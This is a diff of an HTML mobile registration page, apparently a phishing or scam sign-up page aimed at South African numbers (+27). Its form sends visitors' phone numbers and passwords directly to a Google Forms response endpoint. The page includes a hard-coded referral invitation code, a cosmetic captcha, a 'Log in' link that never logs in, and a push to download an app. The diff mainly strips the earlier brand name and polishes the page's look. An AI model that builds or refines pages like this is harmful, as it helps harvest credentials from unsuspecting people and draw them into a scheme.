@@ -1,415 +1,536 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Vitalize - Register</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="format-detection" content="telephone=no, email=no" />
+  <title>Register</title>
+  <link rel="preconnect" href="https://i.postimg.cc" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --primary-color: #243B55;
-      --secondary-color: #141E30;
-      --accent-color: #3a7bd5;
-      --error-color: #e74c3c;
-      --success-color: #2ecc71;
-      --text-color: #333;
-      --light-gray: #f5f5f5;
-      --border-radius: 12px;
-      --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      --bg-top: #f6f8fc;
+      --bg-bottom: #eef2f7;
+      --card: rgba(255, 255, 255, 0.9);
+      --text: #111827;
+      --muted: #6b7280;
+      --primary: #ef4444;
+      --primary-pressed: #dc2626;
+      --border: rgba(229, 231, 235, 0.5);
+      --ring: #fca5a5;
+      --success: #16a34a;
+      --error: #dc2626;
     }
-
-    * {
-      box-sizing: border-box;
+    
+    html, body {
+      height: 100%;
       margin: 0;
       padding: 0;
-    }
-
-    body {
-      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-      background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      color: var(--text-color);
-      line-height: 1.6;
-      position: relative;
+      font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
+      color: var(--text);
       overflow-x: hidden;
     }
-
-    body::before {
-      content: "";
+    
+    /* Animated Background */
+    .bg-animation {
       position: fixed;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: 
-        radial-gradient(circle, rgba(255,255,255,0.08) 1%, transparent 1%) 0 0,
-        radial-gradient(circle, rgba(255,255,255,0.05) 1%, transparent 1%) 20px 20px;
-      background-size: 40px 40px;
-      animation: moveBg 20s linear infinite;
-      z-index: 0;
-    }
-
-    @keyframes moveBg {
-      0% { transform: translate(0,0); }
-      100% { transform: translate(40px,40px); }
-    }
-
-    .register-container {
-      width: 100%;
-      max-width: 450px;
-      position: relative;
-      z-index: 2;
-      animation: fadeInUp 0.6s ease-out;
-    }
-
-    @keyframes fadeInUp {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-
-    .register-box {
-      background: rgba(255, 255, 255, 0.98);
-      border-radius: var(--border-radius);
-      box-shadow: var(--box-shadow);
-      padding: 30px 25px;
-      width: 100%;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-      backdrop-filter: blur(5px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-
-    .register-box::before {
-      content: "";
-      position: absolute;
       top: 0;
       left: 0;
-      right: 0;
-      height: 5px;
-      background: linear-gradient(90deg, var(--accent-color), var(--primary-color));
-    }
-
-    .logo {
-      width: 100px;
-      height: auto;
-      margin: 0 auto 20px;
-      display: block;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
-    }
-
-    .register-box h2 {
-      margin-bottom: 25px;
-      color: var(--primary-color);
-      font-size: 1.5rem;
-      font-weight: 700;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      font-size: 0.9rem;
-      color: var(--primary-color);
-    }
-
-    input[type="text"],
-    input[type="tel"],
-    input[type="password"] {
       width: 100%;
-      padding: 14px 16px;
-      border: 1px solid #ddd;
-      border-radius: var(--border-radius);
-      font-size: 1rem;
-      transition: all 0.3s ease;
-      background-color: white;
+      height: 100%;
+      z-index: -1;
+      background: linear-gradient(-45deg, #f6f8fc, #eef2f7, #f0f5ff, #e8f0fe);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
     }
-
-    input:focus {
-      border-color: var(--accent-color);
-      box-shadow: 0 0 0 3px rgba(58, 123, 213, 0.2);
-      outline: none;
+    
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-
-    input[readonly] {
-      background-color: var(--light-gray);
-      color: #666;
-      cursor: not-allowed;
+    
+    /* Floating Bubbles */
+    .bubbles {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+      top: 0;
+      left: 0;
     }
-
-    .checkbox-group {
-      margin: 20px 0;
+    
+    .bubble {
+      position: absolute;
+      bottom: -100px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      animation: floating 15s infinite ease-in;
+    }
+    
+    @keyframes floating {
+      0% {
+        transform: translateY(0) rotate(0deg);
+        opacity: 1;
+        bottom: -100px;
+      }
+      100% {
+        transform: translateY(-1000px) rotate(720deg);
+        opacity: 0;
+        bottom: 100%;
+      }
+    }
+    
+    .page {
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 12px;
+      background: transparent;
+    }
+    
+    .nav .left, .nav .right {
+      width: 80px;
       display: flex;
       align-items: center;
     }
-
-    .checkbox-group input {
-      margin-right: 10px;
-      min-width: 18px;
-      min-height: 18px;
+    
+    .scroll {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 24px;
     }
-
-    .checkbox-group label {
-      font-weight: normal;
-      margin-bottom: 0;
-      font-size: 0.9rem;
+    
+    .logo {
+      width: 140px;
+      margin: 8px auto 20px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+      transition: transform 0.3s ease;
     }
-
-    .checkbox-group a {
-      color: var(--accent-color);
-      text-decoration: none;
+    
+    .logo:hover {
+      transform: scale(1.05);
     }
-
-    .checkbox-group a:hover {
-      text-decoration: underline;
+    
+    .card {
+      width: 100%;
+      max-width: 460px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      box-shadow: 0 10px 25px rgba(0,0,0,.08);
+      padding: 24px 20px 28px;
+      backdrop-filter: blur(5px);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
-
-    .btn-container {
-      margin-top: 25px;
-      position: relative;
+    
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 30px rgba(0,0,0,0.12);
     }
-
+    
+    .field {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 12px 16px;
+      background: rgba(255, 255, 255, 0.7);
+      margin-top: 16px;
+      transition: all 0.3s ease;
+    }
+    
+    .field:first-child {
+      margin-top: 0;
+    }
+    
+    .field:focus-within {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px var(--ring);
+    }
+    
+    .cc-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 46px;
+      height: 28px;
+      padding: 0 8px;
+      border-radius: 999px;
+      background: #f3f4f6;
+      border: 1px solid var(--border);
+    }
+    
+    input {
+      border: 0;
+      outline: 0;
+      font-size: 15px;
+      flex: 1;
+      background: transparent;
+      color: var(--text);
+    }
+    
+    input::placeholder {
+      color: var(--muted);
+      opacity: 0.7;
+    }
+    
+    .help {
+      margin-top: 8px;
+      font-size: 13px;
+      color: var(--muted);
+      padding-left: 8px;
+    }
+    
+    .actions {
+      padding: 24px 2px 0;
+    }
+    
     .btn {
       width: 100%;
+      border-radius: 999px;
       padding: 16px;
-      border: none;
-      border-radius: var(--border-radius);
-      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-      color: white;
-      font-size: 1rem;
+      font-size: 16px;
       font-weight: 600;
+      border: 0;
       cursor: pointer;
+      display: block;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 10px rgba(36, 59, 85, 0.3);
     }
-
-    .btn:hover {
-      background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
+    
+    .btn-primary {
+      background: var(--primary);
+      color: #fff;
+      box-shadow: 0 4px 6px rgba(239, 68, 68, 0.2);
+    }
+    
+    .btn-primary:hover {
+      background: var(--primary-pressed);
       transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(36, 59, 85, 0.4);
+      box-shadow: 0 6px 12px rgba(239, 68, 68, 0.3);
     }
-
-    .btn:active {
+    
+    .btn-primary:active {
       transform: translateY(0);
+      box-shadow: 0 2px 4px rgba(239, 68, 68, 0.2);
     }
-
-    .btn-decoration {
-      height: 2px;
-      width: 60%;
-      margin: 15px auto 0;
-      background: linear-gradient(90deg, transparent, rgba(58, 123, 213, 0.4), transparent);
-      border-radius: 50%;
+    
+    .btn-plain {
+      margin-top: 12px;
+      background: rgba(255, 255, 255, 0.7);
+      color: var(--text);
+      border: 1px solid var(--border);
     }
-
-    .login-link {
-      margin-top: 25px;
-      font-size: 0.95rem;
-      color: #666;
+    
+    .btn-plain:hover {
+      background: rgba(255, 255, 255, 0.9);
+      border-color: var(--primary);
     }
-
-    .login-link a {
-      color: var(--accent-color);
-      font-weight: 600;
+    
+    .footer {
+      max-width: 460px;
+      width: 100%;
+      margin: 16px auto 0;
+      color: var(--text);
+      display: flex;
+      justify-content: space-between;
+      font-size: 14px;
+    }
+    
+    .footer a {
+      color: var(--primary);
       text-decoration: none;
-      transition: all 0.2s ease;
+      font-weight: 500;
+      transition: color 0.3s ease;
     }
-
-    .login-link a:hover {
+    
+    .footer a:hover {
+      color: var(--primary-pressed);
       text-decoration: underline;
-      color: var(--primary-color);
     }
-
-    .message {
+    
+    .toast {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      bottom: 24px;
+      background: #353535;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 14px;
       display: none;
-      padding: 15px;
-      border-radius: var(--border-radius);
-      margin-top: 20px;
-      font-weight: 600;
-      animation: fadeIn 0.5s ease;
-      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      animation: fadeIn 0.3s ease;
+      z-index: 100;
     }
-
+    
     @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
+      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
     }
-
-    .success-message {
-      background-color: rgba(46, 204, 113, 0.1);
-      color: var(--success-color);
-      border: 1px solid rgba(46, 204, 113, 0.3);
+    
+    /* Captcha styling */
+    .captcha-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
-
-    .error-message {
-      background-color: rgba(231, 76, 60, 0.1);
-      color: var(--error-color);
-      border: 1px solid rgba(231, 76, 60, 0.3);
+    
+    .captcha {
+      cursor: pointer;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      transition: transform 0.3s ease;
     }
-
-    .info-message {
-      background-color: rgba(52, 152, 219, 0.1);
-      color: #3498db;
-      border: 1px solid rgba(52, 152, 219, 0.3);
+    
+    .captcha:hover {
+      transform: scale(1.05);
     }
-
+    
+    /* Input focus effects */
+    input:focus {
+      animation: inputFocus 0.5s ease;
+    }
+    
+    @keyframes inputFocus {
+      0% { transform: translateX(0); }
+      20% { transform: translateX(5px); }
+      40% { transform: translateX(-5px); }
+      60% { transform: translateX(5px); }
+      80% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+    
+    /* Responsive adjustments */
     @media (max-width: 480px) {
-      body {
-        padding: 15px;
+      .card {
+        padding: 20px 16px 24px;
       }
-
-      .register-box {
-        padding: 25px 20px;
+      
+      .field {
+        padding: 10px 14px;
       }
-
-      .logo {
-        width: 90px;
-        margin-bottom: 15px;
-      }
-
-      .register-box h2 {
-        font-size: 1.3rem;
-        margin-bottom: 20px;
-      }
-
-      input[type="text"],
-      input[type="tel"],
-      input[type="password"] {
-        padding: 12px 14px;
-        font-size: 0.95rem;
-      }
-
+      
       .btn {
         padding: 14px;
-        font-size: 0.95rem;
-      }
-
-      .checkbox-group label {
-        font-size: 0.85rem;
       }
     }
   </style>
 </head>
 <body>
-  <div class="register-container">
-    <div class="register-box">
-      <img src="https://i.postimg.cc/FzbXX2NS/pngegg.png" alt="Vitalize Logo" class="logo">
-      <h2>Vitalize Registration</h2>
+  <!-- Animated Background Elements -->
+  <div class="bg-animation"></div>
+  <div class="bubbles" id="bubbles"></div>
 
-      <form id="registerForm" action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse" method="POST" target="hiddenFrame">
-        <div class="form-group">
-          <label for="countryCode">Country Code</label>
-          <input type="text" id="countryCode" name="entry.11026931" value="+27" readonly>
+  <div class="page">
+    <header class="nav">
+      <div class="left"><button type="button" style="background:transparent;border:0;font-size:18px">←</button></div>
+      <div class="title"></div>
+      <div class="right"><button type="button" style="background:transparent;border:0;font-weight:600">EN</button></div>
+    </header>
+
+    <main class="scroll">
+      <img class="logo" alt="Logo" src="https://i.postimg.cc/wjrLz46f/logo-en-US.png" />
+
+      <!-- form linked to Google Form -->
+      <form id="registerForm" class="card"
+            action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse"
+            method="POST" target="_self">
+
+        <!-- Phone (entry.11026931) -->
+        <div class="field">
+          <span class="cc-badge">+27</span>
+          <input id="phone" name="entry.11026931" type="tel" placeholder="Please enter your mobile number" required/>
         </div>
 
-        <div class="form-group">
-          <label for="phone">Phone Number</label>
-          <input type="tel" id="phone" name="entry.11026931" placeholder="Enter phone number" required>
+        <!-- Password (entry.70675987) -->
+        <div class="field">
+          <input id="password" name="entry.70675987" type="password" placeholder="Please enter your login password" required minlength="6"/>
         </div>
 
-        <div class="form-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" name="entry.70675987" placeholder="Enter password" required>
+        <!-- Confirm Password (entry.2139866834) -->
+        <div class="field">
+          <input id="confirm" name="entry.2139866834" type="password" placeholder="Please confirm your password" required minlength="6"/>
         </div>
 
-        <div class="form-group">
-          <label for="confirmPassword">Confirm Password</label>
-          <input type="password" id="confirmPassword" name="entry.2139866834" placeholder="Confirm password" required>
+        <!-- Captcha (not sent to Google, just validation) -->
+        <div class="field">
+          <input id="captchaInput" type="text" placeholder="Please enter the verification code" required/>
+          <div class="captcha"><canvas id="captchaCanvas" width="112" height="31"></canvas></div>
+        </div>
+        <div class="help">Verification code is case-insensitive.</div>
+
+        <!-- Invitation Code fixed (entry.1944770665) -->
+        <div class="field">
+          <input id="invite" name="entry.1944770665" type="text" value="6976367" readonly/>
         </div>
 
-        <div class="form-group">
-          <label for="invite">Invitation Code</label>
-          <input type="text" id="invite" name="entry.1944770665" value="25114" readonly>
-        </div>
-
-        <div class="checkbox-group">
-          <input type="checkbox" id="terms" required>
-          <label for="terms">I agree to the <a href="#">Terms & Conditions</a></label>
-        </div>
-
-        <div class="btn-container">
-          <button type="submit" class="btn">Register</button>
-          <div class="btn-decoration"></div>
+        <div class="actions">
+          <button class="btn btn-primary" type="submit">Register Now</button>
+          <button class="btn btn-plain" type="button" id="downloadBtn">Already have an account? Download the app</button>
         </div>
       </form>
 
-      <iframe name="hiddenFrame" style="display:none;"></iframe>
-
-      <div id="successMessage" class="message success-message">✅ Registration successful! Welcome to Vitalize</div>
-      <div id="errorMessage" class="message error-message">❌ Password format is incorrect. Password must be at least 8 characters long and contain a number.</div>
-      <div id="loginMessage" class="message info-message">ℹ️ You must create an account first.</div>
-
-      <div class="login-link">
-        Already have an account? <a href="#" id="loginLink">Login here</a>
+      <div class="footer">
+        <span>Have an account?</span>
+        <a id="loginLink" href="#">Log in</a>
       </div>
-    </div>
+    </main>
   </div>
 
+  <div class="toast" id="toast"></div>
+
   <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const registerForm = document.getElementById('registerForm');
-      const successMessage = document.getElementById('successMessage');
-      const errorMessage = document.getElementById('errorMessage');
-      const loginMessage = document.getElementById('loginMessage');
-      const loginLink = document.getElementById('loginLink');
-      const passwordInput = document.getElementById('password');
+    // Create floating bubbles
+    function createBubbles() {
+      const bubblesContainer = document.getElementById('bubbles');
+      const bubbleCount = 15;
+      
+      for (let i = 0; i < bubbleCount; i++) {
+        const bubble = document.createElement('div');
+        bubble.classList.add('bubble');
+        
+        // Random size between 40px and 100px
+        const size = Math.random() * 60 + 40;
+        bubble.style.width = `${size}px`;
+        bubble.style.height = `${size}px`;
+        
+        // Random position
+        bubble.style.left = `${Math.random() * 100}%`;
+        
+        // Random animation duration and delay
+        const duration = Math.random() * 20 + 10;
+        const delay = Math.random() * 10;
+        bubble.style.animationDuration = `${duration}s`;
+        bubble.style.animationDelay = `${delay}s`;
+        
+        bubblesContainer.appendChild(bubble);
+      }
+    }
+    
+    // Toast notification
+    const toastEl = document.getElementById('toast');
+    function toast(msg, isError = false) {
+      toastEl.textContent = msg;
+      toastEl.style.display = 'block';
+      toastEl.style.backgroundColor = isError ? '#dc2626' : '#353535';
+      
+      setTimeout(() => {
+        toastEl.style.display = 'none';
+      }, 2000);
+    }
 
-      // Handle login link click
-      loginLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        
-        // Hide other messages
-        successMessage.style.display = 'none';
-        errorMessage.style.display = 'none';
-        
-        // Show login message
-        loginMessage.style.display = 'block';
-        
-        // Hide message after 3 seconds
-        setTimeout(() => {
-          loginMessage.style.display = 'none';
-        }, 3000);
-      });
+    // captcha
+    const canvas = document.getElementById('captchaCanvas');
+    const ctx = canvas.getContext('2d');
+    let captchaText = '';
+    
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    
+    function drawNoise() {
+      for (let i = 0; i < 10; i++) {
+        ctx.strokeStyle = `rgba(0,0,0,${Math.random() * 0.3})`;
+        ctx.beginPath();
+        ctx.moveTo(rand(0, 112), rand(0, 31));
+        ctx.lineTo(rand(0, 112), rand(0, 31));
+        ctx.stroke();
+      }
+    }
+    
+    function genCaptcha() {
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      captchaText = Array.from({length: 4}, () => chars[rand(0, chars.length - 1)]).join('');
+      
+      ctx.clearRect(0, 0, 112, 31);
+      ctx.fillStyle = '#f8fafc';
+      ctx.fillRect(0, 0, 112, 31);
+      drawNoise();
+      
+      // More stylish captcha text
+      ctx.fillStyle = '#111';
+      ctx.font = 'bold 18px Arial';
+      
+      // Add distortion to each character
+      for (let i = 0; i < captchaText.length; i++) {
+        const x = 20 + i * 22;
+        const y = 22 + Math.sin(i) * 3;
+        ctx.save();
+        ctx.translate(x, y);
+        ctx.rotate(Math.random() * 0.4 - 0.2);
+        ctx.fillText(captchaText[i], 0, 0);
+        ctx.restore();
+      }
+    }
+    
+    document.querySelector('.captcha').addEventListener('click', genCaptcha);
+    genCaptcha();
 
-      // Handle form submission
-      registerForm.addEventListener('submit', function(e) {
-        // Hide all messages first
-        successMessage.style.display = 'none';
-        errorMessage.style.display = 'none';
-        loginMessage.style.display = 'none';
-        
-        // Validate password
-        const password = passwordInput.value;
-        const isPasswordValid = password.length >= 8 && /\d/.test(password);
-        
-        if (!isPasswordValid) {
-          // Show error message but don't prevent form submission
-          errorMessage.style.display = 'block';
-          errorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        } else {
-          // Show success message
-          successMessage.style.display = 'block';
-          successMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }
-        
-        // Form will submit to Google Forms in all cases
-        // We'll show a temporary message after submission
-        setTimeout(() => {
-          if (!isPasswordValid) {
-            errorMessage.style.display = 'block';
-          } else {
-            successMessage.style.display = 'block';
-          }
-        }, 1000);
-      });
+    // validate before submit
+    const form = document.getElementById('registerForm');
+    form.addEventListener('submit', function(e) {
+      const pwd = document.getElementById('password').value;
+      const conf = document.getElementById('confirm').value;
+      const userCaptcha = document.getElementById('captchaInput').value.trim();
+      
+      if (pwd !== conf) { 
+        e.preventDefault(); 
+        toast('Passwords do not match.', true); 
+        return;
+      }
+      
+      if (userCaptcha.toUpperCase() !== captchaText.toUpperCase()) { 
+        e.preventDefault(); 
+        toast('Incorrect verification code.', true); 
+        genCaptcha(); 
+        return;
+      }
     });
+    
+    // Handle login link click
+    document.getElementById('loginLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      toast('You must register an account first.', true);
+      
+      // Add shake animation to the card
+      const card = document.querySelector('.card');
+      card.style.animation = 'shake 0.5s';
+      setTimeout(() => {
+        card.style.animation = '';
+      }, 500);
+    });
+    
+    // Add shake animation to CSS
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+        20%, 40%, 60%, 80% { transform: translateX(5px); }
+      }
+    `;
+    document.head.appendChild(style);
+    
+    // Initialize bubbles when page loads
+    window.addEventListener('load', createBubbles);
   </script>
 </body>
 </html>
